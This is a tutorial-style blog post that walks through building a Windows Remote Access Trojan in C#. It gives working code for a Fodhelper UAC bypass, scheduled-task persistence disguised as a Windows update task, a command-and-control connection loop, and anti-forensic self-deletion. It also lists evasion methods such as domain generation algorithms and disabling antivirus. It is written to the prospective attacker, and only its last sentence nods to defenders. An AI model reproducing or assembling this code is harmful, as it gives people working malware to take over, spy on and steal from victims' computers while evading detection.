---
title: "So You Want to Write a RAT? Here is the Blueprint in C#"
image: "/images/blog/mal/rat/rat.png"
date: "2026-06-25"
excerpt: "A Remote Access Trojan (RAT) is a piece of malicious software that disguises itself as a legitimate file but, once executed, opens a secret backdoor into your system. A RAT is built on three pillars: privilege escalation, persistence, and stealth."
category: "Malware"
---

# What is a RAT?

![learn to write RATs](/images/blog/mal/ratt.png)

A Remote Access Trojan (RAT) is a piece of malicious software that disguises itself as a legitimate file but, once executed, opens a secret backdoor into your system. Unlike standard malware that causes immediate damage, a RAT sits silently in the background, giving an attacker full remote control over your machine, think of it as a digital puppet string. From that point on, the attacker can steal sensitive files, activate your webcam, log every keystroke you type, and even use your computer as a launchpad for further attacks, all while remaining completely invisible to you.

# The Anatomy of a RAT
What makes a RAT?

## Elevated privileges (run with administrative or SYSTEM-level rights)
For a RAT to be effective, it needs the highest possible level of system access. Without elevated privileges, your RAT is essentially handcuffed—it can't access protected system directories, manipulate core processes, or maintain persistence against user interference.

## Techniques to run with elevated priv:
- Social engineering – Tricking the user into right-clicking and selecting "Run as administrator"
- UAC bypass techniques – Silently escalating without triggering the Windows User Account Control prompt (e.g., using known exploit paths like CMSTP, Fodhelper, or Event Viewer)
  *it's safe to say, if you cant elevate stick to what you have and figure something out, they is always a way*

## Once elevated, your RAT can:
* Read and write to any file on the system
* Modify the Windows Registry freely
* Inject into system processes (e.g., lsass.exe, winlogon.exe)
* Disable security tools and tamper with AV configurations
* Install kernel-level drivers or hooks

a simple UAC bypass technique
```csharp
private static bool BypassUACFodHelper()
{
    try
    {
        // Get the current executable path
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
        
        // Registry path used by fodhelper.exe for auto-elevation
        string registryPath = @"Software\Classes\ms-settings\Shell\Open\command";
        
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(registryPath))
        {
            if (key == null)
                return false;
            
            // Set the command to execute our payload
            key.SetValue("", currentExePath, RegistryValueKind.String);
            
            // Empty DelegateExecute triggers the UAC bypass
            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
        }
        
        // Launch fodhelper.exe - it will auto-elevate and run our command
        Process.Start(new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\fodhelper.exe",
            UseShellExecute = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        });
        
        // Wait for execution to complete
        Thread.Sleep(2000 + new Random().Next(1000));
        
        return true;
    }
    catch (Exception ex)
    {
        // Log error if needed: Console.WriteLine($"UAC Bypass failed: {ex.Message}");
        return false;
    }
    finally
    {
        // Always clean up the registry entries
        CleanupRegistryKeys();
    }
}

private static void CleanupRegistryKeys()
{
    try
    {
        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
    }
    catch
    {
        // Ignore cleanup errors - registry key may not exist
    }
}
```

## Initialization Phase/Deployment
### Persistence
Persistence is the mechanism that ensures a RAT survives system reboots and remains active on the compromised machine. Without persistence, the RAT would only run until the user logs off or restarts their computer, making the attack ephemeral and largely useless for long-term control.

### Why you should do it:
Survive reboots – The RAT should automatically start when Windows boots
Maintain access – The attacker doesn't need to re-infect the machine after every restart
Background operation – The RAT runs silently without user interaction
Redundancy – Multiple persistence mechanisms ensure the RAT stays active even if one is removed

### How it works:
There are numerous ways to achieve persistence on Windows, ranging from simple registry entries to scheduled tasks and Windows services. The most common techniques include:
Scheduled Tasks – Create a task that runs the RAT at boot, at user login, or on a regular interval
Registry Run Keys – Add entries to HKCU\Software\Microsoft\Windows\CurrentVersion\Run or HKLM\...\Run
Windows Services – Install the RAT as a service that starts automatically
Startup Folder – Place a shortcut in the user's Startup folder
WMI Event Subscription – Use WMI to trigger execution on system events
Boot Execute – Modify HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute

### Why I try Scheduled Tasks:
Less suspicious than Run keys (many legitimate apps use tasks)
Can run with SYSTEM privileges
Supports complex triggers (on idle, at login, every X minutes)
Can be hidden from casual users via schtasks.exe
Persists across reboots automatically

demo
```csharp
private static void AddToStartup()
{
    try
    {
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
        string taskName = "WindowsUpdate"; // Disguised as a legitimate Windows task

        // Attempt to remove any existing task with the same name (cleanup)
        try
        {
            Process deleteTask = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = $"/delete /tn \"{taskName}\" /f",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            });
            deleteTask?.WaitForExit(2000);
        }
        catch
        {
            // Ignore errors - the task may not exist
        }

        // Create a new scheduled task that runs the RAT every 1 minute
        Process createTask = Process.Start(new ProcessStartInfo
        {
            FileName = "schtasks.exe",
            Arguments = $"/create /tn \"{taskName}\" /tr \"{currentExePath}\" /sc minute /mo 1 /f",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        });

        if (createTask != null)
        {
            createTask.WaitForExit(5000);

            if (createTask.ExitCode == 0)
            {
                Program.WriteLog($"Persistence added: Task Scheduler will run '{taskName}' every 1 minute");
            }
            else
            {
                Program.WriteLog($"Failed to create scheduled task (Exit Code: {createTask.ExitCode})");
            }
        }
    }
    catch (Exception ex)
    {
        Program.WriteLog($"Failed to add persistence via Task Scheduler: {ex.Message}");
    }
}
```

## Initializing operational activities
###
<to be continued; functionalities within a rat>

## Run 
### Establish Connect to C2

Once the RAT is deployed and running with elevated privileges, its primary objective is to establish a persistent connection to the Command and Control (C2) server. This connection serves as the lifeline between the attacker and the compromised machine. it's how commands are issued, data is exfiltrated, and the RAT is controlled remotely.

### Why you have to do it:
Remote control – The attacker needs a bidirectional channel to issue commands
Data exfiltration – Stolen files, credentials, and screenshots need to be sent back
Persistence – The RAT should automatically reconnect if the connection drops
Stealth – Outbound connections are less suspicious than inbound ones (firewalls often allow outbound traffic)

### How it works:
The RAT runs in a continuous loop, attempting to connect to a predefined IP address and port (often embedded in the executable's resources or fetched from a remote configuration). Once a connection is established, the RAT sends identifying information about the victim's machine—hostname, username, OS version, and privilege level—so the attacker knows which bot they're controlling. The RAT then enters a main loop where it listens for incoming commands, executes them, and sends back the results. If the connection drops, the RAT logs the failure, disconnects cleanly, and retries after a short delay, ensuring the attacker can regain control at any time.

### Common techniques include:
Hardcoded IP/Port – Embedded in the executable's resources
Domain Generation Algorithms (DGAs) – Generate new C2 domains to avoid takedown
Fast-flux networks – Constantly changing IP addresses
Encrypted traffic – SSL/TLS to hide commands from network monitoring
HTTP/HTTPS tunneling – Blend in with normal web traffic
DNS tunneling – Use DNS queries for C2 communication

```csharp
/// <summary>
/// Main execution loop for the RAT client.
/// Attempts to connect to the C2 server and maintains the connection.
/// Automatically reconnects if the connection is lost.
/// </summary>
private static void Run()
{
    Program.WriteLog("=== RMM Client Starting ===");
    Program.WriteLog($"Process ID: {Process.GetCurrentProcess().Id}");
    Program.WriteLog($"Is Admin: {Program.IsRunningElevated()}");
    Program.WriteLog($"Current Directory: {Directory.GetCurrentDirectory()}");
    Program.WriteLog($"Executable Path: {Process.GetCurrentProcess().MainModule?.FileName ?? "Unknown"}");

    while (Program.running)
    {
        try
        {
            Program.WriteLog("=== Starting connection attempt ===");

            // Read C2 configuration from resources (embedded in the executable)
            string c2Host = ResourceReader.GetIP();
            string c2Port = ResourceReader.GetPort();

            Program.WriteLog($"Read IP from resources: '{c2Host}'");
            Program.WriteLog($"Read Port from resources: '{c2Port}'");

            // Fallback to default values if resources are missing
            if (string.IsNullOrEmpty(c2Host) || string.IsNullOrEmpty(c2Port))
            {
                Program.WriteLog("WARNING: IP or Port is empty, using defaults");
                c2Host = "127.0.0.1";
                c2Port = "8080";
            }

            // Parse and validate the port
            if (!int.TryParse(c2Port, out int c2PortParsed))
            {
                Program.WriteLog($"WARNING: Invalid port '{c2Port}', using default 8080");
                c2PortParsed = 8080;
            }

            Program.WriteLog($"Attempting to connect to {c2Host}:{c2PortParsed}");
            Program.WriteLog($"Network object is null: {Program.network == null}");

            // Ensure network object exists
            if (Program.network == null)
            {
                Program.WriteLog("ERROR: Network object is null, cannot connect");
                Thread.Sleep(5000);
                continue;
            }

            // Attempt the connection
            bool connected = Program.network.Connect(c2Host, c2PortParsed);
            Program.WriteLog($"Connect() returned: {connected}");
            Program.WriteLog($"Network.IsConnected: {Program.network?.IsConnected ?? false}");

            if (connected)
            {
                Program.WriteLog($"SUCCESS: Connected to {c2Host}:{c2PortParsed}");

                // Send initial client information to the C2 server
                Program.WriteLog("Sending client info...");
                try
                {
                    Program.SendClientInfo();
                    Program.WriteLog("Client info sent successfully");
                }
                catch (Exception ex)
                {
                    Program.WriteLog($"ERROR: Failed to send client info: {ex.Message}");
                    Program.WriteLog($"Stack trace: {ex.StackTrace}");
                }

                // Enter the main command processing loop
                Program.WriteLog("Entering MainLoop...");
                Program.MainLoop();
                Program.WriteLog("MainLoop exited, connection lost. Will reconnect...");

                // Clean up the connection
                Program.network?.Disconnect();
            }
            else
            {
                Program.WriteLog($"FAILED: Connection to {c2Host}:{c2PortParsed} failed");
                Program.WriteLog("Retrying in 5 seconds...");
                Thread.Sleep(5000);
            }
        }
        catch (Exception ex)
        {
            Program.WriteLog($"CRITICAL ERROR in Run: {ex.Message}");
            Program.WriteLog($"Exception type: {ex.GetType().Name}");
            Program.WriteLog($"Stack trace: {ex.StackTrace}");

            if (ex.InnerException != null)
            {
                Program.WriteLog($"Inner exception: {ex.InnerException.Message}");
            }

            // Attempt to cleanly disconnect
            try
            {
                Program.network?.Disconnect();
            }
            catch (Exception disconnectEx)
            {
                Program.WriteLog($"Error during disconnect: {disconnectEx.Message}");
            }

            // Wait before retrying to avoid spinning
            Thread.Sleep(5000);
        }
    }
}
```

## CleanUp

## SelfDelete
Once your RAT has completed its mission or when you wants to cut ties and cover tracks, the RAT must disappear without a trace. Self-delete is the mechanism that ensures the executable removes itself from the victim's system, leaving behind no forensic evidence for investigators or AV scanners to find.

### Why it has to be done:
- OPSEC (Operational Security) – Removing the file eliminates a key piece of evidence
- Anti-forensics – Makes incident response harder by removing the primary artifact
- Clean exit – Prevents the user from discovering the file accidentally
- Burning the bridge – Cuts the connection cleanly after exfiltration or persistence is established

### How it works:
The fundamental challenge is that a running executable cannot delete itself while in memory. To work around this, the RAT spawns a separate process, typically a batch script or PowerShell command—that waits a few seconds, kills the main process (or waits for it to exit), then deletes the original file and finally deletes itself. The batch script runs asynchronously, so the main process can exit normally while the cleanup happens in the background.

### Common techniques include:
Batch scripts with del /f /q commands
PowerShell one-liners with Remove-Item -Force
Using cmd.exe /c with delayed execution (timeout or ping delays)
Scheduled tasks that trigger cleanup on reboot

simple demo
```csharp
private static void SelfDelete()
{
    try
    {
        string currentExePath = Process.GetCurrentProcess().MainModule.FileName;

        // Optionally hide the file before deletion (if melt mode is enabled)
        if (Program.meltEnabled)
        {
            try
            {
                File.SetAttributes(currentExePath, FileAttributes.Hidden | FileAttributes.System);
                Program.WriteLog("File set to hidden + system attributes (melt enabled)");
            }
            catch (Exception ex)
            {
                Program.WriteLog($"Failed to set file attributes: {ex.Message}");
            }
        }

        // Create a temporary batch script in the temp folder
        string batchPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.bat");

        // The batch script:
        // - Waits 2 seconds for the main process to exit
        // - Deletes the original RAT executable
        // - Deletes itself (the batch file)
        string batchContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q """ + currentExePath + @"""
del /f /q ""%~f0""
";

        File.WriteAllText(batchPath, batchContent);

        // Execute the batch script hidden
        Process.Start(new ProcessStartInfo
        {
            FileName = batchPath,
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false
        });

        Program.WriteLog("Self-delete batch script created and started");
    }
    catch (Exception ex)
    {
        Program.WriteLog($"Failed to create self-delete script: {ex.Message}");
    }
}
```

## Conclusion
A RAT is built on three pillars: privilege escalation, persistence, and stealth. You start with UAC bypass to gain admin rights without triggering alerts. Then you ensure survival via scheduled tasks or registry Run keys so the RAT respawns after every reboot. The C2 connection provides the lifeline—a persistent outbound channel that feeds commands to the main loop, where modules handle everything from keylogging to file theft to screen capture. Throughout, stealth is non-negotiable: hide the file with system attributes, deploy self-defense to block termination, and finally self-delete via batch script when the job is done. None of this is theoretical—every technique maps to specific Windows internals that defenders must understand to catch it. Know the code, know the tricks, and you'll know exactly where to look when the RAT comes knocking.


